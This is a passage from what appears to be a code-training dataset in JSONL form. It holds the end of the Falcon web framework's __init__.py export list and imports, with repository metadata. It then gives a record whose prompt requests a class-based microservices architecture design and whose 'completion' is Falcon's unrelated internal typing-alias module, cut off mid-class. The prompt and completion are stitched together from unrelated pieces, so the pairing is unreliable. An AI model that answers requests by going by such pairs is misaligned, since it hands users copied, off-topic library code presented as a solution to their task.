'HTTPMissingParam',\n    'HTTPNetworkAuthenticationRequired',\n    'HTTPNotAcceptable',\n    'HTTPNotFound',\n    'HTTPNotImplemented',\n    'HTTPContentTooLarge',\n    'HTTPPayloadTooLarge',\n    'HTTPPreconditionFailed',\n    'HTTPPreconditionRequired',\n    'HTTPRangeNotSatisfiable',\n    'HTTPRequestHeaderFieldsTooLarge',\n    'HTTPRouteNotFound',\n    'HTTPServiceUnavailable',\n    'HTTPTooManyRequests',\n    'HTTPUnauthorized',\n    'HTTPUnavailableForLegalReasons',\n    'HTTPUnprocessableEntity',\n    'HTTPUnsupportedMediaType',\n    'HTTPUriTooLong',\n    'HTTPVersionNotSupported',\n    'InvalidMediaRange',\n    'InvalidMediaType',\n    'MediaMalformedError',\n    'MediaNotFoundError',\n    'MediaValidationError',\n    'MultipartParseError',\n    'OperationNotAllowed',\n    'PayloadTypeError',\n    'UnsupportedError',\n    'UnsupportedScopeError',\n    'WebSocketDisconnected',\n    'WebSocketHandlerNotFound',\n    'WebSocketPathNotFound',\n    'WebSocketServerError',\n    # HTTP status codes\n    'HTTP_100',\n    'HTTP_101',\n    'HTTP_102',\n    'HTTP_103',\n    'HTTP_200',\n    'HTTP_201',\n    'HTTP_202',\n    'HTTP_203',\n    'HTTP_204',\n    'HTTP_205',\n    'HTTP_206',\n    'HTTP_207',\n    'HTTP_208',\n    'HTTP_226',\n    'HTTP_300',\n    'HTTP_301',\n    'HTTP_302',\n    'HTTP_303',\n    'HTTP_304',\n    'HTTP_305',\n    'HTTP_307',\n    'HTTP_308',\n    'HTTP_400',\n    'HTTP_401',\n    'HTTP_402',\n    'HTTP_403',\n    'HTTP_404',\n    'HTTP_405',\n    'HTTP_406',\n    'HTTP_407',\n    'HTTP_408',\n    'HTTP_409',\n    'HTTP_410',\n    'HTTP_411',\n    'HTTP_412',\n    'HTTP_413',\n    'HTTP_414',\n    'HTTP_415',\n    'HTTP_416',\n    'HTTP_417',\n    'HTTP_418',\n    'HTTP_421',\n    'HTTP_422',\n    'HTTP_423',\n    'HTTP_424',\n    'HTTP_425',\n    'HTTP_426',\n    'HTTP_428',\n    'HTTP_429',\n    'HTTP_431',\n    'HTTP_451',\n    'HTTP_500',\n    'HTTP_501',\n    'HTTP_502',\n    'HTTP_503',\n    'HTTP_504',\n    'HTTP_505',\n    'HTTP_506',\n    'HTTP_507',\n    'HTTP_508',\n    'HTTP_510',\n    'HTTP_511',\n    'HTTP_701',\n    'HTTP_702',\n    'HTTP_703',\n    'HTTP_710',\n    'HTTP_711',\n    'HTTP_712',\n    'HTTP_719',\n    'HTTP_720',\n    'HTTP_721',\n    'HTTP_722',\n    'HTTP_723',\n    'HTTP_724',\n    'HTTP_725',\n    'HTTP_726',\n    'HTTP_727',\n    'HTTP_740',\n    'HTTP_741',\n    'HTTP_742',\n    'HTTP_743',\n    'HTTP_744',\n    'HTTP_745',\n    'HTTP_748',\n    'HTTP_749',\n    'HTTP_750',\n    'HTTP_753',\n    'HTTP_754',\n    'HTTP_755',\n    'HTTP_759',\n    'HTTP_771',\n    'HTTP_772',\n    'HTTP_773',\n    'HTTP_774',\n    'HTTP_776',\n    'HTTP_777',\n    'HTTP_778',\n    'HTTP_779',\n    'HTTP_780',\n    'HTTP_781',\n    'HTTP_782',\n    'HTTP_783',\n    'HTTP_784',\n    'HTTP_785',\n    'HTTP_786',\n    'HTTP_791',\n    'HTTP_792',\n    'HTTP_797',\n    'HTTP_799',\n    'HTTP_ACCEPTED',\n    'HTTP_ALREADY_REPORTED',\n    'HTTP_BAD_GATEWAY',\n    'HTTP_BAD_REQUEST',\n    'HTTP_CONFLICT',\n    'HTTP_CONTENT_TOO_LARGE',\n    'HTTP_CONTINUE',\n    'HTTP_CREATED',\n    'HTTP_EARLY_HINTS',\n    'HTTP_EXPECTATION_FAILED',\n    'HTTP_FAILED_DEPENDENCY',\n    'HTTP_FORBIDDEN',\n    'HTTP_FOUND',\n    'HTTP_GATEWAY_TIMEOUT',\n    'HTTP_GONE',\n    'HTTP_HTTP_VERSION_NOT_SUPPORTED',\n    'HTTP_IM_A_TEAPOT',\n    'HTTP_IM_USED',\n    'HTTP_INSUFFICIENT_STORAGE',\n    'HTTP_INTERNAL_SERVER_ERROR',\n    'HTTP_LENGTH_REQUIRED',\n    'HTTP_LOCKED',\n    'HTTP_LOOP_DETECTED',\n    'HTTP_METHOD_NOT_ALLOWED',\n    'HTTP_MISDIRECTED_REQUEST',\n    'HTTP_MOVED_PERMANENTLY',\n    'HTTP_MULTIPLE_CHOICES',\n    'HTTP_MULTI_STATUS',\n    'HTTP_NETWORK_AUTHENTICATION_REQUIRED',\n    'HTTP_NON_AUTHORITATIVE_INFORMATION',\n    'HTTP_NOT_ACCEPTABLE',\n    'HTTP_NOT_EXTENDED',\n    'HTTP_NOT_FOUND',\n    'HTTP_NOT_IMPLEMENTED',\n    'HTTP_NOT_MODIFIED',\n    'HTTP_NO_CONTENT',\n    'HTTP_OK',\n    'HTTP_PARTIAL_CONTENT',\n    'HTTP_PAYMENT_REQUIRED',\n    'HTTP_PERMANENT_REDIRECT',\n    'HTTP_PRECONDITION_FAILED',\n    'HTTP_PRECONDITION_REQUIRED',\n    'HTTP_PROCESSING',\n    'HTTP_PROXY_AUTHENTICATION_REQUIRED',\n    'HTTP_REQUESTED_RANGE_NOT_SATISFIABLE',\n    'HTTP_REQUEST_HEADER_FIELDS_TOO_LARGE',\n    'HTTP_REQUEST_TIMEOUT',\n    'HTTP_REQUEST_URI_TOO_LONG',\n    'HTTP_RESET_CONTENT',\n    'HTTP_SEE_OTHER',\n    'HTTP_SERVICE_UNAVAILABLE',\n    'HTTP_SWITCHING_PROTOCOLS',\n    'HTTP_TEMPORARY_REDIRECT',\n    'HTTP_TOO_EARLY',\n    'HTTP_TOO_MANY_REQUESTS',\n    'HTTP_UNAUTHORIZED',\n    'HTTP_UNAVAILABLE_FOR_LEGAL_REASONS',\n    'HTTP_UNPROCESSABLE_ENTITY',\n    'HTTP_UNSUPPORTED_MEDIA_TYPE',\n    'HTTP_UPGRADE_REQUIRED',\n    'HTTP_USE_PROXY',\n    'HTTP_VARIANT_ALSO_NEGOTIATES',\n)\n\n# NOTE(kgriffs,vytas): Hoist classes and functions into the falcon namespace.\n#   Please explicitly list ALL exports.\nfrom falcon.app import API\nfrom falcon.app import App\nfrom falcon.constants import ASGI_SUPPORTED  # NOQA: F401\nfrom falcon.constants import COMBINED_METHODS\nfrom falcon.constants import DEFAULT_MEDIA_TYPE\nfrom falcon.constants import HTTP_METHODS\nfrom falcon.constants import MEDIA_BMP\nfrom falcon.constants import MEDIA_CSV\nfrom falcon.constants import MEDIA_GIF\nfrom falcon.constants import MEDIA_HTML\nfrom falcon.constants import MEDIA_JPEG\nfrom falcon.constants import MEDIA_JS\nfrom falcon.constants import MEDIA_JSON\nfrom falcon.constants import MEDIA_MSGPACK\nfrom falcon.constants import MEDIA_MULTIPART\nfrom falcon.constants import MEDIA_PARQUET\nfrom falcon.constants import MEDIA_PNG\nfrom falcon.constants import MEDIA_TEXT\nfrom falcon.constants import MEDIA_URLENCODED\nfrom falcon.constants import MEDIA_XML\nfrom falcon.constants import MEDIA_YAML\nfrom falcon.constants import PYTHON_VERSION  # NOQA: F401\nfrom falcon.constants import SINGLETON_HEADERS\nfrom falcon.constants import WEBDAV_METHODS\nfrom falcon.constants import WebSocketPayloadType\nfrom falcon.errors import CompatibilityError\nfrom falcon.errors import DelimiterError\nfrom falcon.errors import HeaderNotSupported\nfrom falcon.errors import HTTPBadGateway\nfrom falcon.errors import HTTPBadRequest\nfrom falcon.errors import HTTPConflict\nfrom falcon.errors import HTTPContentTooLarge\nfrom falcon.errors import HTTPFailedDependency\nfrom falcon.errors import HTTPForbidden\nfrom falcon.errors import HTTPGatewayTimeout\nfrom falcon.errors import HTTPGone\nfrom falcon.errors import HTTPInsufficientStorage\nfrom falcon.errors import HTTPInternalServerError\nfrom falcon.errors import HTTPInvalidHeader\nfrom falcon.errors import HTTPInvalidParam\nfrom falcon.errors import HTTPLengthRequired\nfrom falcon.errors import HTTPLocked\nfrom falcon.errors import HTTPLoopDetected\nfrom falcon.errors import HTTPMethodNotAllowed\nfrom falcon.errors import HTTPMissingHeader\nfrom falcon.errors import HTTPMissingParam\nfrom falcon.errors import HTTPNetworkAuthenticationRequired\nfrom falcon.errors import HTTPNotAcceptable\nfrom falcon.errors import HTTPNotFound\nfrom falcon.errors import HTTPNotImplemented\nfrom falcon.errors import HTTPPayloadTooLarge\nfrom falcon.errors import HTTPPreconditionFailed\nfrom falcon.errors import HTTPPreconditionRequired\nfrom falcon.errors import HTTPRangeNotSatisfiable\nfrom falcon.errors import HTTPRequestHeaderFieldsTooLarge\nfrom falcon.errors import HTTPRouteNotFound\nfrom falcon.errors import HTTPServiceUnavailable\nfrom falcon.errors import HTTPTooManyRequests\nfrom falcon.errors import HTTPUnauthorized\nfrom falcon.errors import HTTPUnavailableForLegalReasons\nfrom falcon.errors import HTTPUnprocessableEntity\nfrom falcon.errors import HTTPUnsupportedMediaType\nfrom falcon.errors import HTTPUriTooLong\nfrom falcon.errors import HTTPVersionNotSupported\nfrom falcon.errors import InvalidMediaRange\nfrom falcon.errors import InvalidMediaType\nfrom falcon.errors import MediaMalformedError\nfrom falcon.errors import MediaNotFoundError\nfrom falcon.errors import MediaValidationError\nfrom falcon.errors import MultipartParseError\nfrom falcon.errors import OperationNotAllowed\nfrom falcon.errors import PayloadTypeError\nfrom falcon.errors import UnsupportedError\nfrom falcon.errors import UnsupportedScopeError\nfrom falcon.errors import WebSocketDisconnected\nfrom falcon.errors import WebSocketHandlerNotFound\nfrom falcon.errors import WebSocketPathNotFound\nfrom falcon.errors import WebSocketServerError\nfrom falcon.hooks import after\nfrom falcon.hooks import before\nfrom falcon.http_error import HTTPError\nfrom falcon.http_status import HTTPStatus\nfrom falcon.middleware import CORSMiddleware\nfrom falcon.redirects import HTTPFound\nfrom falcon.redirects import HTTPMovedPermanently\nfrom falcon.redirects import HTTPPermanentRedirect\nfrom falcon.redirects import HTTPSeeOther\nfrom falcon.redirects import HTTPTemporaryRedirect\nfrom falcon.request import Forwarded\nfrom falcon.request import Request\nfrom falcon.request import RequestOptions\nfrom falcon.response import Response\nfrom falcon.response import ResponseOptions\n\n# Hoist HTTP status codes.\nfrom falcon.status_codes import HTTP_100\nfrom falcon.status_codes import HTTP_101\nfrom falcon.status_codes import HTTP_102\nfrom falcon.status_codes import HTTP_103\nfrom falcon.status_codes import HTTP_200\nfrom falcon.status_codes import HTTP_201\nfrom falcon.status_codes import HTTP_202\nfrom falcon.status_codes import HTTP_203\nfrom falcon.status_codes import HTTP_204\nfrom falcon.status_codes import HTTP_205\nfrom falcon.status_codes import HTTP_206\nfrom falcon.status_codes import HTTP_207\nfrom falcon.status_codes import HTTP_208\nfrom falcon.status_codes import HTTP_226\nfrom falcon.status_codes import HTTP_300\nfrom falcon.status_codes import HTTP_301\nfrom falcon.status_codes import HTTP_302\nfrom falcon.status_codes import HTTP_303\nfrom falcon.status_codes import HTTP_304\nfrom falcon.status_codes import HTTP_305\nfrom falcon.status_codes import HTTP_307\nfrom falcon.status_codes import HTTP_308\nfrom falcon.status_codes import HTTP_400\nfrom falcon.status_codes import HTTP_401\nfrom falcon.status_codes import HTTP_402\nfrom falcon.status_codes import HTTP_403\nfrom falcon.status_codes import HTTP_404\nfrom falcon.status_codes import HTTP_405\nfrom falcon.status_codes import HTTP_406\nfrom falcon.status_codes import HTTP_407\nfrom falcon.status_codes import HTTP_408\nfrom falcon.status_codes import HTTP_409\nfrom falcon.status_codes import HTTP_410\nfrom falcon.status_codes import HTTP_411\nfrom falcon.status_codes import HTTP_412\nfrom falcon.status_codes import HTTP_413\nfrom falcon.status_codes import HTTP_414\nfrom falcon.status_codes import HTTP_415\nfrom falcon.status_codes import HTTP_416\nfrom falcon.status_codes import HTTP_417\nfrom falcon.status_codes import HTTP_418\nfrom falcon.status_codes import HTTP_421\nfrom falcon.status_codes import HTTP_422\nfrom falcon.status_codes import HTTP_423\nfrom falcon.status_codes import HTTP_424\nfrom falcon.status_codes import HTTP_425\nfrom falcon.status_codes import HTTP_426\nfrom falcon.status_codes import HTTP_428\nfrom falcon.status_codes import HTTP_429\nfrom falcon.status_codes import HTTP_431\nfrom falcon.status_codes import HTTP_451\nfrom falcon.status_codes import HTTP_500\nfrom falcon.status_codes import HTTP_501\nfrom falcon.status_codes import HTTP_502\nfrom falcon.status_codes import HTTP_503\nfrom falcon.status_codes import HTTP_504\nfrom falcon.status_codes import HTTP_505\nfrom falcon.status_codes import HTTP_506\nfrom falcon.status_codes import HTTP_507\nfrom falcon.status_codes import HTTP_508\nfrom falcon.status_codes import HTTP_510\nfrom falcon.status_codes import HTTP_511\nfrom falcon.status_codes import HTTP_701\nfrom falcon.status_codes import HTTP_702\nfrom falcon.status_codes import HTTP_703\nfrom falcon.status_codes import HTTP_710\nfrom falcon.status_codes import HTTP_711\nfrom falcon.status_codes import HTTP_712\nfrom falcon.status_codes import HTTP_719\nfrom falcon.status_codes import HTTP_720\nfrom falcon.status_codes import HTTP_721\nfrom falcon.status_codes import HTTP_722\nfrom falcon.status_codes import HTTP_723\nfrom falcon.status_codes import HTTP_724\nfrom falcon.status_codes import HTTP_725\nfrom falcon.status_codes import HTTP_726\nfrom falcon.status_codes import HTTP_727\nfrom falcon.status_codes import HTTP_740\nfrom falcon.status_codes import HTTP_741\nfrom falcon.status_codes import HTTP_742\nfrom falcon.status_codes import HTTP_743\nfrom falcon.status_codes import HTTP_744\nfrom falcon.status_codes import HTTP_745\nfrom falcon.status_codes import HTTP_748\nfrom falcon.status_codes import HTTP_749\nfrom falcon.status_codes import HTTP_750\nfrom falcon.status_codes import HTTP_753\nfrom falcon.status_codes import HTTP_754\nfrom falcon.status_codes import HTTP_755\nfrom falcon.status_codes import HTTP_759\nfrom falcon.status_codes import HTTP_771\nfrom falcon.status_codes import HTTP_772\nfrom falcon.status_codes import HTTP_773\nfrom falcon.status_codes import HTTP_774\nfrom falcon.status_codes import HTTP_776\nfrom falcon.status_codes import HTTP_777\nfrom falcon.status_codes import HTTP_778\nfrom falcon.status_codes import HTTP_779\nfrom falcon.status_codes import HTTP_780\nfrom falcon.status_codes import HTTP_781\nfrom falcon.status_codes import HTTP_782\nfrom falcon.status_codes import HTTP_783\nfrom falcon.status_codes import HTTP_784\nfrom falcon.status_codes import HTTP_785\nfrom falcon.status_codes import HTTP_786\nfrom falcon.status_codes import HTTP_791\nfrom falcon.status_codes import HTTP_792\nfrom falcon.status_codes import HTTP_797\nfrom falcon.status_codes import HTTP_799\nfrom falcon.status_codes import HTTP_ACCEPTED\nfrom falcon.status_codes import HTTP_ALREADY_REPORTED\nfrom falcon.status_codes import HTTP_BAD_GATEWAY\nfrom falcon.status_codes import HTTP_BAD_REQUEST\nfrom falcon.status_codes import HTTP_CONFLICT\nfrom falcon.status_codes import HTTP_CONTENT_TOO_LARGE\nfrom falcon.status_codes import HTTP_CONTINUE\nfrom falcon.status_codes import HTTP_CREATED\nfrom falcon.status_codes import HTTP_EARLY_HINTS\nfrom falcon.status_codes import HTTP_EXPECTATION_FAILED\nfrom falcon.status_codes import HTTP_FAILED_DEPENDENCY\nfrom falcon.status_codes import HTTP_FORBIDDEN\nfrom falcon.status_codes import HTTP_FOUND\nfrom falcon.status_codes import HTTP_GATEWAY_TIMEOUT\nfrom falcon.status_codes import HTTP_GONE\nfrom falcon.status_codes import HTTP_HTTP_VERSION_NOT_SUPPORTED\nfrom falcon.status_codes import HTTP_IM_A_TEAPOT\nfrom falcon.status_codes import HTTP_IM_USED\nfrom falcon.status_codes import HTTP_INSUFFICIENT_STORAGE\nfrom falcon.status_codes import HTTP_INTERNAL_SERVER_ERROR\nfrom falcon.status_codes import HTTP_LENGTH_REQUIRED\nfrom falcon.status_codes import HTTP_LOCKED\nfrom falcon.status_codes import HTTP_LOOP_DETECTED\nfrom falcon.status_codes import HTTP_METHOD_NOT_ALLOWED\nfrom falcon.status_codes import HTTP_MISDIRECTED_REQUEST\nfrom falcon.status_codes import HTTP_MOVED_PERMANENTLY\nfrom falcon.status_codes import HTTP_MULTI_STATUS\nfrom falcon.status_codes import HTTP_MULTIPLE_CHOICES\nfrom falcon.status_codes import HTTP_NETWORK_AUTHENTICATION_REQUIRED\nfrom falcon.status_codes import HTTP_NO_CONTENT\nfrom falcon.status_codes import HTTP_NON_AUTHORITATIVE_INFORMATION\nfrom falcon.status_codes import HTTP_NOT_ACCEPTABLE\nfrom falcon.status_codes import HTTP_NOT_EXTENDED\nfrom falcon.status_codes import HTTP_NOT_FOUND\nfrom falcon.status_codes import HTTP_NOT_IMPLEMENTED\nfrom falcon.status_codes import HTTP_NOT_MODIFIED\nfrom falcon.status_codes import HTTP_OK\nfrom falcon.status_codes import HTTP_PARTIAL_CONTENT\nfrom falcon.status_codes import HTTP_PAYMENT_REQUIRED\nfrom falcon.status_codes import HTTP_PERMANENT_REDIRECT\nfrom falcon.status_codes import HTTP_PRECONDITION_FAILED\nfrom falcon.status_codes import HTTP_PRECONDITION_REQUIRED\nfrom falcon.status_codes import HTTP_PROCESSING\nfrom falcon.status_codes import HTTP_PROXY_AUTHENTICATION_REQUIRED\nfrom falcon.status_codes import HTTP_REQUEST_HEADER_FIELDS_TOO_LARGE\nfrom falcon.status_codes import HTTP_REQUEST_TIMEOUT\nfrom falcon.status_codes import HTTP_REQUEST_URI_TOO_LONG\nfrom falcon.status_codes import HTTP_REQUESTED_RANGE_NOT_SATISFIABLE\nfrom falcon.status_codes import HTTP_RESET_CONTENT\nfrom falcon.status_codes import HTTP_SEE_OTHER\nfrom falcon.status_codes import HTTP_SERVICE_UNAVAILABLE\nfrom falcon.status_codes import HTTP_SWITCHING_PROTOCOLS\nfrom falcon.status_codes import HTTP_TEMPORARY_REDIRECT\nfrom falcon.status_codes import HTTP_TOO_EARLY\nfrom falcon.status_codes import HTTP_TOO_MANY_REQUESTS\nfrom falcon.status_codes import HTTP_UNAUTHORIZED\nfrom falcon.status_codes import HTTP_UNAVAILABLE_FOR_LEGAL_REASONS\nfrom falcon.status_codes import HTTP_UNPROCESSABLE_ENTITY\nfrom falcon.status_codes import HTTP_UNSUPPORTED_MEDIA_TYPE\nfrom falcon.status_codes import HTTP_UPGRADE_REQUIRED\nfrom falcon.status_codes import HTTP_USE_PROXY\nfrom falcon.status_codes import HTTP_VARIANT_ALSO_NEGOTIATES\nfrom falcon.stream import BoundedStream\n\n# NOTE(kgriffs): Ensure that \"from falcon import uri\" will import\n#   the same front-door module as \"import falcon.uri\". This works by\n#   priming the import cache with the one we want.\nimport falcon.uri  # NOQA: F401\n\n# Hoist utilities.\nfrom falcon.util import async_to_sync\nfrom falcon.util import BufferedReader\nfrom falcon.util import CaseInsensitiveDict\nfrom falcon.util import code_to_http_status\nfrom falcon.util import Context\nfrom falcon.util import create_task\n\n# NOTE(kgriffs): Hosting only because this was previously referenced\n#   in the docs as falcon.deprecated\nfrom falcon.util import deprecated\nfrom falcon.util import dt_to_http\nfrom falcon.util import ETag\nfrom falcon.util import get_argnames\nfrom falcon.util import get_bound_method\nfrom falcon.util import get_running_loop\nfrom falcon.util import http_cookies\nfrom falcon.util import http_date_to_dt\nfrom falcon.util import http_now\nfrom falcon.util import http_status_to_code\nfrom falcon.util import IS_64_BITS\nfrom falcon.util import is_python_func\nfrom falcon.util import mediatypes\nfrom falcon.util import misc\nfrom falcon.util import parse_header\nfrom falcon.util import reader\nfrom falcon.util import runs_sync\nfrom falcon.util import secure_filename\nfrom falcon.util import structures\nfrom falcon.util import sync\nfrom falcon.util import sync_to_async\nfrom falcon.util import sys  # NOQA: F401\nfrom falcon.util import time\nfrom falcon.util import TimezoneGMT\nfrom falcon.util import to_query_str\nfrom falcon.util import uri\nfrom falcon.util import wrap_sync_to_async\nfrom falcon.util import wrap_sync_to_async_unsafe\n\n# Package version\nfrom falcon.version import __version__  # NOQA: F401\n\n# NOTE(kgriffs): Only to be used internally on the rare occasion that we\n#   need to log something that we can't communicate any other way.\n_logger = _logging.getLogger('falcon')\n_logger.addHandler(_logging.NullHandler())\n", "metadata": {"source": "github.com/falconry/falcon", "file_path": "falcon/__init__.py", "language": "python", "complexity": "complex", "star_count": 9692, "quality_score": 0.85, "features": {"has_microservices": false, "has_api_design": true, "has_load_balancing": false, "has_caching": true, "has_database_design": false, "has_security": true, "has_monitoring": true, "has_scaling": false, "has_cloud_patterns": false, "has_containers": false, "has_diagrams": false, "line_count": 651}, "authority_level": "high", "authentic": true}}
{"domain": "system_architecture", "category": "microservices_patterns", "prompt": "### System_Architecture Request (CLAUDE.md):\nCreate class-based implementation for Design microservices architecture with service communication patterns for distributed system requirements\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "# Copyright 2021-2025 by Vytautas Liuolia.\n#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#    http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n# distributed under the License is distributed on an \"AS IS\" BASIS,\n# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n# See the License for the specific language governing permissions and\n# limitations under the License.\n\"\"\"Private type aliases used internally by Falcon..\"\"\"\n\nfrom __future__ import annotations\n\nfrom enum import auto\nfrom enum import Enum\nimport http\nfrom http.cookiejar import Cookie\nimport sys\nfrom typing import (\n    Any,\n    Awaitable,\n    Callable,\n    Dict,\n    Iterable,\n    List,\n    Literal,\n    Mapping,\n    Optional,\n    Pattern,\n    Protocol,\n    Tuple,\n    TYPE_CHECKING,\n    TypeVar,\n    Union,\n)\n\n# NOTE(vytas): Mypy still struggles to handle a conditional import in the EAFP\n#   fashion, so we branch on Py version instead (which it does understand).\nif sys.version_info >= (3, 11):\n    from wsgiref.types import StartResponse as StartResponse\n    from wsgiref.types import WSGIEnvironment as WSGIEnvironment\nelse:\n    WSGIEnvironment = Dict[str, Any]\n    StartResponse = Callable[[str, List[Tuple[str, str]]], Callable[[bytes], None]]\n\nif TYPE_CHECKING:\n    from falcon.asgi import Request as AsgiRequest\n    from falcon.asgi import Response as AsgiResponse\n    from falcon.asgi import WebSocket\n    from falcon.asgi_spec import AsgiEvent\n    from falcon.asgi_spec import AsgiSendMsg\n    from falcon.http_error import HTTPError\n    from falcon.request import Request\n    from falcon.response import Response\n\n\nclass _Unset(Enum):\n    UNSET = auto()\n\n\n_T = TypeVar('_T')\n_UNSET = _Unset.UNSET\nUnsetOr = Union[Literal[_Unset.UNSET], _T]\n\nLink = Dict[str, str]\nCookieArg = Mapping[str, Union[str, Cookie]]\n# Error handlers\nErrorHandler = Callable[['Request', 'Response', Exception, Dict[str, Any]], None]\n\n\nclass AsgiErrorHandler(Protocol):\n    async def __call__(\n        self,\n        req: AsgiRequest,\n        resp: Optional[AsgiResponse],\n        error: Exception,\n        params: Dict[str, Any],\n        *,\n        ws: Optional[WebSocket] = ...,\n    ) -> None: ...\n\n\n# Error serializers\nErrorSerializer = Callable[['Request', 'Response', 'HTTPError'], None]\n\n# Sinks\nSinkPrefix = Union[str, Pattern[str]]\n\n\nclass SinkCallable(Protocol):\n    def __call__(\n        self, req: Request, resp: Response, **kwargs: Optional[str]\n    ) -> None: ...\n\n\nclass AsgiSinkCallable(Protocol):\n    async def __call__(\n        self, req: AsgiRequest, resp: AsgiResponse, **kwargs: Optional[str]\n    ) -> None: ...\n\n\nHeaderMapping = Mapping[str, str]\nHeaderIter = Iterable[Tuple[str, str]]\nHeaderArg = Union[HeaderMapping, HeaderIter]\nResponseStatus = Union[http.HTTPStatus, str, int]\nStoreArg = Optional[Dict[str, Any]]\nResource = object\nRangeSetHeader = Union[Tuple[int, int, int], Tuple[int, int, int, str]]\n\n\n# WSGI\nclass ResponderMethod(Protocol):\n    def __call__(\n        self,\n        resource: Resource,\n        req: Request,\n        resp: Response,\n        **kwargs: Any,\n    ) -> None: ...\n\n\nclass ResponderCallable(Protocol):\n    def __call__(self, req: Request, resp: Response, **kwargs: Any) -> None: ...\n\n\nProcessRequestMethod = Callable[['Request', 'Response'], None]\nProcessResourceMethod = Callable[\n    ['Request', 'Response', Resource, Dict[str, Any]], None\n]\nProcessResponseMethod = Callable[['Request', 'Response', Resource, bool], None]\n\n\n# ASGI\nclass AsgiResponderMethod(Protocol):\n    async def __call__(\n        self,\n        resource: Resource,\n        req: AsgiRequest,\n        resp: AsgiResponse,\n        **kwargs: Any,\n    ) -> None: ...\n\n\nclass AsgiResponderCallable(Protocol):\n    async def __call__(\n        self, req: AsgiRequest, resp: AsgiResponse, **kwargs: Any\n    ) -> None: ...\n\n\nclass AsgiResponderWsCallable(Protocol):\n    async def __call__(\n        self, req: AsgiRequest, ws: WebSocket, **kwargs: Any\n    ) -> None: ...\n\n\nAsgiReceive = Callable[[], Awaitable['AsgiEvent']]\nAsgiSend = Callable[['AsgiSendMsg'], Awaitable[None]]\nAsgiProcessRequestMethod = Callable[['AsgiRequest', 'AsgiResponse'], Awaitable[None]]\nAsgiProcessResourceMethod = Callable[\n    ['AsgiRequest', 'AsgiResponse', Resource, Dict[str, Any]], Awaitable[None]\n]\nAsgiProcessResponseMethod = Callable[\n    ['AsgiRequest', 'AsgiResponse', Resource, bool], Awaitable[None]\n]\nAsgiProcessRequestWsMethod = Callable[['AsgiRequest', 'WebSocket'], Awaitable[None]]\nAsgiProcessResourceWsMethod = Callable[\n    ['AsgiRequest', 'WebSocket', Resource, Dict[str, Any]], Awaitable[None]\n]\nResponseCallbacks = Union[\n    Tuple[Callable[[], None], Literal[False]],\n    Tuple[Callable[[], Awaitable[None]], Literal[True]],\n]\n\n\n# Routing\n\nMethodDict = Union[\n    Dict[str, ResponderCallable],\n    Dict[str, Union[AsgiResponderCallable, AsgiResponderWsCallable]],\n]\n\n\nclass FindMethod(Protocol):\n    def __call__(\n        self, uri: str, req: Optional[Request]\n    ) -> Optional[Tuple[object, MethodDict, Dict[str, Any], Optional[str]]]: ...\n\n\n# Media\nclass SerializeSync(Protocol):\n    def __call__(self, media: Any, content_type: Optional[str] = ...) -> bytes: ...\n\n\nDeserializeSync = Callable[[bytes], Any]\n\nResponder = Union[ResponderMethod, AsgiResponderMethod]\n\n\n# WSGI middleware interface\nclass WsgiMiddlewareWithProcessRequest(Protocol):\n    \"\"\"WSGI Middleware with request handler.\"\"\"\n\n    def process_request(self, req: Request, resp: Response) -> None: ...\n\n\nclass WsgiMiddlewareWithProcessResource(Protocol):\n    \"\"\"WSGI Middleware with resource handler.\"\"\"\n\n    def process_resource(\n        self,\n        req: Request,\n        resp: Response,\n        resource: object,\n        params: Dict[str, Any],\n    ) -> None: ...\n\n\nclass WsgiMiddlewareWithProcessResponse(Protocol):\n    \"\"\"WSGI Middleware with response handler.\"\"\"\n\n    def process_response(\n        self, req: Request, resp: Response, resource: object, req_succeeded: bool\n    ) -> None: ...\n\n\n# ASGI lifespan middleware interface\nclass AsgiMiddlewareWithProcessStartup(Protocol):\n    \"\"\"ASGI middleware with startup handler.\"\"\"\n\n    async def process_startup(\n        self, scope: Mapping[str, Any], event: Mapping[str, Any]\n    ) -> None: ...\n\n\nclass AsgiMiddlewareWithProcessShutdown(Protocol):\n    \"\"\"ASGI middleware with shutdown handler.\"\"\"\n\n    async def process_shutdown(\n        self, scope: Mapping[str, Any], event: Mapping[str, Any]\n    ) -> None: ...\n\n\n# ASGI middleware interface\nclass AsgiMiddlewareWithProcessRequest(Protocol):\n    \"\"\"ASGI middleware with request handler.\"\"\"\n\n    async def process_request(self, req: AsgiRequest, resp: AsgiResponse) -> None: ...\n\n\nclass AsgiMiddlewareWithProcessResource(Protocol):\n    \"\"\"ASGI middleware with resource handler.\"\"\"\n\n    async def process_resource(\n        self,\n        req: AsgiRequest,\n        resp: AsgiResponse,\n        resource: object,\n        params: Mapping[str, Any],\n    ) -> None: ...\n\n\nclass AsgiMiddlewareWithProcessResponse(Protocol):\n    \"\"\"ASGI middleware with response handler.\"\"\"\n\n    async def process_response(\n        self,\n        req: AsgiRequest,\n        resp: AsgiResponse,\n        resource: object,\n        req_succeeded: bool,\n    ) -> None: ...\n\n\n# ASGI WebSocket middleware\nclass AsgiMiddlewareWithProcessRequestWs(Protocol):\n    \"\"\"ASGI middleware with WebSocket request handler.\"\"\"\n\n    async def process_request_ws(self, req: AsgiRequest, ws: WebSocket) -> None: ...\n\n\nclass AsgiMiddlewareWithProcessResourceWs(Protocol):\n    \"\"\"ASGI middleware with WebSocket resource handler.\"\"\"\n\n    async def process_resource_ws(\n        self,\n        req: AsgiRequest,\n        ws: WebSocket,\n        resource: object,\n        params: Mapping[str, Any],\n    ) -> None: ...\n\n\n# Universal middleware that provides async versions via the _async postfix\nclass UniversalMiddlewareWithProcessRequest(WsgiMiddlewareWithProcessRequest, Protocol):\n    \"\"\"WSGI/ASGI middleware with request handler.\"\"\"\n\n    async def process_request_async(\n        self, req: AsgiRequest, resp: AsgiResponse\n    ) -> None: ...\n\n\nclass UniversalMiddlewareWithProcessResource(\n    WsgiMiddlewareWithProcessResource, Protocol\n):\n    \"\"\"WSGI/ASGI middleware with resource handler.\"\"\"\n\n    async def process_resource_async(\n        self,\n        req: AsgiRequest,\n        resp: AsgiResponse,\n        resource: object,\n        params: Mapping[str, Any],\n    ) -> None: ...\n\n\nclass UniversalMiddlewareWithProcessResponse(\n    WsgiMiddlewareWithProcessResponse, Protocol\n):\n    \"\"\"WSGI/ASGI middleware with response handler.\"\"\"\n\n    async def process_response_async(\n        self,\n        req: 